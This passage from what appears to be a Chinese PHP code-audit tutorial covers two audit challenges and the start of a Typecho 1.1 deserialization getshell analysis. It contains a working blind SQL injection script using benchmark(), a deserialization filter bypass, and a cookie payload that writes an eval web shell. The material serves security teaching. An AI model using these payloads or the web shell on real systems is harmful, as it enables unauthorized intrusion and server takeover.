class="subst">$id</span>&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = <span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$result</span>-&gt;num_rows &gt; <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="variable">$row</span> = <span class="variable">$result</span>-&gt;<span class="title function_ invoke__">fetch_assoc</span>();</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;center&gt;&lt;h1&gt;查询结果为：&lt;/h1&gt;&lt;pre&gt;&#x27;</span>.<span class="string">&lt;&lt;&lt;EOF</span></span><br><span class="line"><span class="string">        +----+---------+--------------------+-------+</span></span><br><span class="line"><span class="string">        | id | name    | email              | score |</span></span><br><span class="line"><span class="string">        +----+---------+--------------------+-------+</span></span><br><span class="line"><span class="string">        |  <span class="subst">&#123;$row[&#x27;id&#x27;]&#125;</span> | <span class="subst">&#123;$row[&#x27;name&#x27;]&#125;</span>   | <span class="subst">&#123;$row[&#x27;email&#x27;]&#125;</span>   |   <span class="subst">&#123;$row[&#x27;score&#x27;]&#125;</span> |</span></span><br><span class="line"><span class="string">        +----+---------+--------------------+-------+&lt;/center&gt;</span></span><br><span class="line"><span class="string">EOF</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">die</span>(<span class="string">&quot;你所查询的对象id值不能为空！&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// config.php</span></span><br><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="variable">$servername</span> = <span class="string">&quot;localhost&quot;</span>;</span><br><span class="line"><span class="variable">$username</span> = <span class="string">&quot;fire&quot;</span>;</span><br><span class="line"><span class="variable">$password</span> = <span class="string">&quot;fire&quot;</span>;</span><br><span class="line"><span class="variable">$dbname</span> = <span class="string">&quot;day10&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>本次题目源于某CMS 0day 漏洞改编。很明显可以看到在上图代码 第29行 处进行了 SQL 语句拼接，然后直接带入数据库查询。而在前一行，其实是有对 GET 方式传来的参数 id 进行过滤的，我们来详细看看过滤函数 stophack 。</p>
<p>我们可以清楚的看到 stophack 函数存在 过滤不严 和 检测到非法字符未直接退出 两个问题。<br><img src="/2024/10/14/WebSecurity/codeaudit/phpaudit3/image-13.png"><br>程序如果检测到非法字符或单词，都会将其替换成字符串 HongRi ，然而并没有立即退出，这样攻击者输入的攻击语句还是会继续被带入数据库查询。只不过这里关键词都被替换成了字符串 HongRi ，所以我们需要绕过这里的黑名单。纵观整个程序，当 SQL 语句执行出错时，并不会将错误信息显示出来，所以此处应为盲注。开发者估计也是考虑到这个问题，便将关键词 sleep 给过滤了，然而这并不能影响攻击者继续使用盲注来获取数据。关于禁用了 sleep 函数的盲注，大家可以直接参考这篇文章：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2288">mysql 延时注入新思路</a> 。这里我直接利用 benchmark 函数来获取flag。python程序如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys, string, requests</span><br><span class="line"></span><br><span class="line">version_chars = <span class="string">&quot;.-&#123;&#125;_&quot;</span> + string.ascii_letters + string.digits + <span class="string">&#x27;#&#x27;</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">40</span>):</span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> version_chars:</span><br><span class="line">        payload = <span class="string">&quot;-1 or if(ascii(mid((select flag from flag),%s,1))=%s,benchmark(200000000,7^3^8),0)&quot;</span> % (i,<span class="built_in">ord</span>(char))</span><br><span class="line">        url = <span class="string">&quot;http://localhost/index.php?id=%s&quot;</span> % payload</span><br><span class="line">        <span class="keyword">if</span> char == <span class="string">&#x27;#&#x27;</span>:</span><br><span class="line">            <span class="keyword">if</span>(flag):</span><br><span class="line">                sys.stdout.write(<span class="string">&quot;\n[+] The flag is： %s&quot;</span> % flag)</span><br><span class="line">                sys.stdout.flush()</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;[-] Something run error!&quot;</span>)</span><br><span class="line">            exit()</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r = requests.post(url=url, timeout=<span class="number">2.0</span>)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            flag += char</span><br><span class="line">            sys.stdout.write(<span class="string">&quot;\r[-] Try to get flag： %s&quot;</span> % flag)</span><br><span class="line">            sys.stdout.flush()</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[-] Something run error!&quot;</span>)</span><br></pre></td></tr></table></figure>
<h2 id="Day-11-Pumpkin-Pie"><a href="#Day-11-Pumpkin-Pie" class="headerlink" title="Day 11 - Pumpkin Pie"></a>Day 11 - Pumpkin Pie</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Template</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cacheFile</span> = <span class="string">&#x27;/tmp/cachefile&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$template</span> = <span class="string">&#x27;&lt;div&gt;Welcome back %s&lt;/div&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$data</span> = <span class="literal">null</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$data</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">loadData</span>(<span class="variable">$data</span>);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">render</span>(<span class="variable">$data</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">loadData</span>(<span class="params"><span class="variable">$data</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">substr</span>(<span class="variable">$data</span>, <span class="number">0</span>, <span class="number">2</span>) !== <span class="string">&#x27;O:&#x27;</span> &amp;&amp; <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/O:\d:/&#x27;</span>, <span class="variable">$data</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="title function_ invoke__">unserialize</span>(<span class="variable">$data</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> [];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">createCache</span>(<span class="params"><span class="variable">$file</span> = <span class="literal">null</span>, <span class="variable">$tpl</span> = <span class="literal">null</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$file</span> = <span class="variable">$file</span> ?? <span class="variable language_">$this</span>-&gt;cacheFile;</span><br><span class="line">        <span class="variable">$tpl</span> = <span class="variable">$tpl</span> ?? <span class="variable language_">$this</span>-&gt;template;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$file</span>, <span class="variable">$tpl</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">render</span>(<span class="params"><span class="variable">$data</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">sprintf</span>(<span class="variable">$this</span>-&gt;template, <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$data</span>[<span class="string">&#x27;name&#x27;</span>]));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">createCache</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> <span class="title class_">Template</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;data&#x27;</span>]);</span><br></pre></td></tr></table></figure>
<p>题目考察对php反序列化函数的利用。在第10行 <strong>loadData()</strong> 函数中，我们发现了 <strong>unserialize</strong> 函数对传入的 <strong>$data</strong> 变量进行了反序列。在反序列化前，对变量内容进行了判断，先不考虑绕过，跟踪一下变量，看看变量是否可控。在代码 <strong>第6行</strong> ，调用了 <strong>loadData()</strong> 函数，<code>$data</code>变量来自于 <strong>__construct()</strong> 构造函数传入的变量。代码第32行，对 <strong>Template</strong> 类进行了实例化，并将 <strong>cookie</strong> 中键为’data’数据作为初始化数据进行传入，<code>$data</code>数据我们可控。开始考虑绕过对传入数据的判断。</p>
<p>代码 <strong>11行</strong> ，第一个if，截取前两个字符，判断反序列化内容是否为对象，如果为对象，返回为空。php可反序列化类型有String,Integer,Boolean,Null,Array,Object。去除掉Object后，考虑采用数组中存储对象进行绕过。</p>
<p>第二个if判断,匹配 字符串为 &#39;O:任意十进制:’,将对象放入数组进行反序列化后，仍然能够匹配到，返回为空，考虑一下如何绕过正则匹配，PHP反序列化处理部分源码如下：</p>
<p><img src="/2024/10/14/WebSecurity/codeaudit/phpaudit3/image-14.png"></p>
<p><img src="/2024/10/14/WebSecurity/codeaudit/phpaudit3/image-15.png"></p>
<p><img src="/2024/10/14/WebSecurity/codeaudit/phpaudit3/image-16.png"></p>
<p>在PHP源码var_unserializer.c，对反序列化字符串进行处理，在代码568行对字符进行判断，并调用相应的函数进行处理，当字符为’O’时，调用 <strong>yy13</strong> 函数，在 <strong>yy13</strong> 函数中，对‘O‘字符的下一个字符进行判断，如果是’:’,则调用 <strong>yy17</strong> 函数,如果不是则调用 <strong>yy3</strong> 函数,直接return 0，结束反序列化。接着看 <strong>yy17</strong> 函数。通过观察yybm[]数组可知，第一个if判断是否为数字，如果为数字则跳转到 <strong>yy20</strong> 函数，第二个判断如果是’+’号则跳转到 <strong>yy19</strong> ，在 <strong>yy19</strong> 中，继续对 <strong>+号</strong> 后面的字符进行判断，如果为数字则跳转到 <strong>yy20</strong> ,如果不是则跳转到 <strong>yy18</strong> ， <strong>y18</strong> 最终跳转到 <strong>yy3</strong> ，退出反序列化流程。由此，在’O:’,后面可以增加’+’，用来绕过正则判断。</p>
<p>绕过了过滤以后，接下来考虑怎样对反序列化进行利用，反序列化本质是将序列化的字符串还原成对应的类实例，在该过程中，我们可控的是序列化字符串的内容，也就是对应类中变量的值。我们无法直接调用类中的函数，但PHP在满足一定的条件下，会自动触发一些函数的调用，该类函数，我们称为魔术方法。通过可控的类变量，触发自动调用的魔术方法，以及魔术方法中存在的可利用点，进而形成反序列化漏洞的利用。</p>
<p>在代码31行，对象销毁时会调用 <strong>createCache()</strong> 函数，函数将 <code>$template</code> 中的内容放到了 <code>$cacheFile</code> 对应的文件中。 <strong>file_put_contents()</strong> 函数，当文件不存在时，会创建该文件。由此可构造一句话，写入当前路径。</p>
<p> <code>$cacheFile</code> 和 <code>$template</code> 为类变量，反序列化可控，由此，构造以下反序列化内容，别忘了加’+’号</p>
<p><img src="/2024/10/14/WebSecurity/codeaudit/phpaudit3/image-17.png"></p>
<p>放入cookie需进行URL编码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:<span class="number">1</span>:&#123;i:<span class="number">0</span>;O:+<span class="number">8</span>:<span class="string">&quot;Template&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">9</span>:<span class="string">&quot;cacheFile&quot;</span>;s:<span class="number">10</span>:<span class="string">&quot;./test.php&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;template&quot;</span>;s:<span class="number">25</span>:<span class="string">&quot;&lt;?php eval(<span class="subst">$_POST</span>[xx]);?&gt;&quot;</span>;&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>文件成功写入：</p>
<h3 id="实例分析-2"><a href="#实例分析-2" class="headerlink" title="实例分析"></a>实例分析</h3><p>本次实例分析，选取的是 <strong>Typecho-1.1</strong> 版本，在该版本中，用户可通过反序列化Cookie数据进行前台Getshell。该漏洞出现于 <strong>install.php</strong> 文件 <strong>230行</strong> ，具体代码如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$config</span> = <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="title class_">Typecho_Cookie</span>::<span class="title function_ invoke__">get</span>(<span class="string">&#x27;__typecho_config&#x27;</span>)));</span><br><span class="line"><span class="title class_">Typecho_Cookie</span>::<span class="title function_ invoke__">delete</span>(<span class="string">&#x27;__typecho_config&#x27;</span>);</span><br><span class="line"><span class="variable">$db</span> = <span class="keyword">new</span> <span class="title class_">Typecho_Db</span>(<span class="variable">$config</span>[<span class="string">&#x27;adapter&#x27;</span>], <span class="variable">$config</span>[<span class="string">&#x27;prefix&#x27;</span>]);</span><br><span class="line"><span class="variable">$db</span>-&gt;<span class="title function_ invoke__">addServer</span>(<span class="variable">$config</span>, <span class="title class_">Typecho_Db</span>::<span class="variable constant_">READ</span> | <span class="title class_">Typecho_Db</span>::<span class="variable constant_">WRITE</span>);</span><br><span class="line"><span class="title class_">Typecho_Db</span>::<span class="title function_ invoke__">set</span>(<span class="variable">$db</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>在上图代码 <strong>第3行</strong> ，对Cookie中的数据base64解码以后，进行了反序列化操作，该值可控，接下来看一下代码触发条件。文件几个关键判断如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 判断是否已经安装</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;finish&#x27;</span>]) &amp;&amp; <span class="title function_ invoke__">file_exists</span>(__TYPECHO_ROOT_DIR__ . <span class="string">&#x27;/config.inc.php&#x27;</span>)</span><br><span class="line">    &amp;&amp; <span class="keyword">empty</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;typecho&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 检查可能的跨站请求</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$_GET</span>) || !<span class="keyword">empty</span>(<span class="variable">$_POST</span>)) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_REFERER&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$parts</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_REFERER&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$parts</span>[<span class="string">&#x27;port&#x27;</span>])) &#123;</span><br><span class="line">        <span class="variable">$parts</span>[<span class="string">&#x27;host&#x27;</span>] = <span class="string">&quot;<span class="subst">&#123;$parts[&#x27;host&#x27;]&#125;</span>:<span class="subst">&#123;$parts[&#x27;port&#x27;]&#125;</span>&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$parts</span>[<span class="string">&#x27;host&#x27;</span>]) || <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_HOST&#x27;</span>] != <span class="variable">$parts</span>[<span class="string">&#x27;host&#x27;</span>]) &#123;</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>第一个if判断，可通过GET传递 <strong>finish&#x3D;任意值</strong> 绕过 ，第二if判断是否有GET或者POST传参，并判断Referer是否为空，第四个if判断Referer是否为本站点。紧接着还有判断，如下图：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;finish&#x27;</span>])) : <span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">if</span> (!<span class="title function_ invoke__">file_exists</span>(__TYPECHO_ROOT_DIR__ . <span class="string">&#x27;/config.inc.php&#x27;</span>)) : <span class="meta">?&gt;</span></span><br><span class="line">&lt;h1 <span class="class"><span class="keyword">class</span>=&quot;<span class="title">typecho</span>-<span class="title">install</span>-<span class="title">title</span>&quot;&gt;&lt;?<span class="title">php</span> <span class="title">_e</span>(&#x27;安装失败！&#x27;); ?&gt;&lt;/<span class="title">h1</span>&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">typecho</span>-<span class="title">install</span>-<span class="title">body</span>&quot;&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">form</span> <span class="title">method</span>=&quot;<span class="title">post</span>&quot; <span class="title">action</span>=&quot;?<span class="title">config</span>&quot; <span class="title">name</span>=&quot;<span class="title">config</span>&quot;&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">p</span> <span class="title">class</span>=&quot;<span class="title">message</span> <span class="title">error</span>&quot;&gt;&lt;?<span class="title">php</span> <span class="title">_e</span>(&#x27;您没有上传 <span class="title">config</span>.<span class="title">inc</span>.<span class="title">php</span> 文件，请检查后再试！&#x27;); ?&gt;&lt;/<span class="title">p</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">button</span> <span class="title">class</span>=&quot;<span class="title">btn</span> <span class="title">primary</span>&quot; <span class="title">type</span>=&quot;<span class="title">submit</span>&quot;&gt;&lt;?<span class="title">php</span> <span class="title">_e</span>(&#x27;重新安装&#x27;); ?&gt;&lt;/<span class="title">button</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;/<span class="title">form</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;?<span class="title">php</span> <span class="title">elseif</span> (!<span class="title">Typecho_Cookie</span>::<span class="title">get</span>(&#x27;<span class="title">__typecho_config</span>&#x27;)): ?&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">h1</span> <span class="title">class</span>=&quot;<span class="title">typecho</span>-<span class="title">install</span>-<span class="title">title</span>&quot;&gt;&lt;?<span class="title">php</span> <span class="title">_e</span>(&#x27;安装完成！&#x27;); ?&gt;&lt;/<span class="title">h1</span>&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">typecho</span>-<span class="title">install</span>-<span class="title">body</span>&quot;&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">form</span> <span class="title">method</span>=&quot;<span class="title">post</span>&quot; <span class="title">action</span>=&quot;?<span class="title">config</span>&quot; <span class="title">name</span>=&quot;<span class="title">config</span>&quot;&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">p</span> <span class="title">class</span>=&quot;<span class="title">message</span> <span class="title">error</span>&quot;&gt;&lt;?<span class="title">php</span> <span class="title">_e</span>(&#x27;您没有进行安装配置，请检查后再试！&#x27;); ?&gt;&lt;/<span class="title">p</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">button</span> <span class="title">class</span>=&quot;<span class="title">btn</span> <span class="title">primary</span>&quot; <span class="title">type</span>=&quot;<span class="title">submit</span>&quot;&gt;&lt;?<span class="title">php</span> <span class="title">_e</span>(&#x27;重新安装&#x27;); ?&gt;&lt;/<span class="title">button</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;/<span class="title">form</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;?<span class="title">php</span> <span class="title">else</span> : ?&gt;</span></span><br><span class="line"><span class="class">&lt;?<span class="title">php</span> <span class="title">endif</span>; ?&gt;</span></span><br></pre></td></tr></table></figure>

<p>第一个if判断 <strong>$_GET[‘finish’]</strong> 是否设置，然后判断 <strong>config.inc.php文件</strong> 是否存在，安装后已存在，第三个判断cookie中 <strong>__typecho_config</strong> 参数是否为空，不为空。进入else分支。综上，具体构造如下图：</p>
<p><img src="/2024/10/14/WebSecurity/codeaudit/phpaudit3/image-18.png"></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$config</span> = <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="title class_">Typecho_Cookie</span>::<span class="title function_ invoke__">get</span>(<span class="string">&#x27;__typecho_config&#x27;</span>)));</span><br><span class="line"><span class="title class_">Typecho_Cookie</span>::<span class="title function_ invoke__">delete</span>(<span class="string">&#x27;__typecho_config&#x27;</span>);</span><br><span class="line"><span class="variable">$db</span> = <span class="keyword">new</span> <span class="title class_">Typecho_Db</span>(<span class="variable">$config</span>[<span class="string">&#x27;adapter&#x27;</span>], <span class="variable">$config</span>[<span class="string">&#x27;prefix&#x27;</span>]);</span><br></pre></td></tr></table></figure>

<p>反序列化结果存储到 <strong>$config</strong> 变量中，然后将 <strong>$config[‘adapter’]</strong> 和 <strong>$config[‘prefix’]</strong> 作为 <strong>Typecho_Db</strong> 类的初始化变量创建类实例。我们可以在 <strong>var&#x2F;Typecho&#x2F;Db.php</strong> 文件中找到该类构造函数代码，具体如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$adapterName</span>, <span class="variable">$prefix</span> = <span class="string">&#x27;typecho_&#x27;</span></span>) </span>&#123;</span><br><span class="line">    <span class="comment">/** 获取适配器名称 */</span></span><br><span class="line">    <span class="variable language_">$this</span>-&gt;_adapterName = <span class="variable">$adapterName</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** 构建适配器完整名称 */</span></span><br><span class="line">    <span class="variable">$adapterName</span> = <span class="string">&#x27;Typecho_Db_Adapter_&#x27;</span> . <span class="variable">$adapterName</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">call_user_func</span>(<span class="keyword">array</span>(<span class="variable">$adapterName</span>, <span class="string">&#x27;isAvailable&#x27;</span>))) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Typecho_Db_Exception</span>(<span class="string">&quot;Adapter <span class="subst">&#123;$adapterName&#125;</span> is not available&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable language_">$this</span>-&gt;_prefix = <span class="variable">$prefix</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** 初始化内部变量 */</span></span><br><span class="line">    <span class="variable language_">$this</span>-&gt;_pool = <span class="keyword">array</span>();</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;_connectedPool = <span class="keyword">array</span>();</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;_config = <span class="keyword">array</span>();</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** 实例化适配器对象 */</span></span><br><span class="line">    <span class="variable language_">$this</span>-&gt;_adapter = <span class="keyword">new</span> <span class="variable">$adapterName</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上图代码 <strong>第6行</strong> ，对传入的 <strong>$adapterName</strong> 变量进行了字符串拼接操作，对于PHP而言，如果 <strong>$adapterName</strong> 类型为对象，则会调用该类 <strong>__toString()</strong> 魔术方法。可作为反序列化的一个触发点，我们全局搜索一下 <strong>__toString()</strong> ，查看是否有可利用的点。实际搜索时，会发现有三个类都定义了 <strong>__toString()</strong> 方法：</p>
<p><img src="/2024/10/14/WebSecurity/codeaudit/phpaudit3/image-19.png"></p>
<ul>
<li><p>第一处 <strong>var\Typecho\Config.php</strong>：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$this</span>-&gt;currentConfig);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>调用 <strong>serialize()</strong> 函数进行序列化操作，会自动触发 <strong>__sleep()</strong> ，如果存在可利用的 <strong>__sleep()</strong> ，则可以进一步利用。</p>
</li>
<li><p>第二处 <strong>var\Typecho\Db\Query.php</strong>：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">      <span class="keyword">switch</span> (<span class="variable language_">$this</span>-&gt;_sqlPreBuild[<span class="string">&#x27;action&#x27;</span>]) &#123;</span><br><span class="line">          <span class="keyword">case</span> <span class="title class_">Typecho_Db</span>::<span class="variable constant_">SELECT</span>:</span><br><span class="line">              <span class="keyword">return</span> <span class="variable 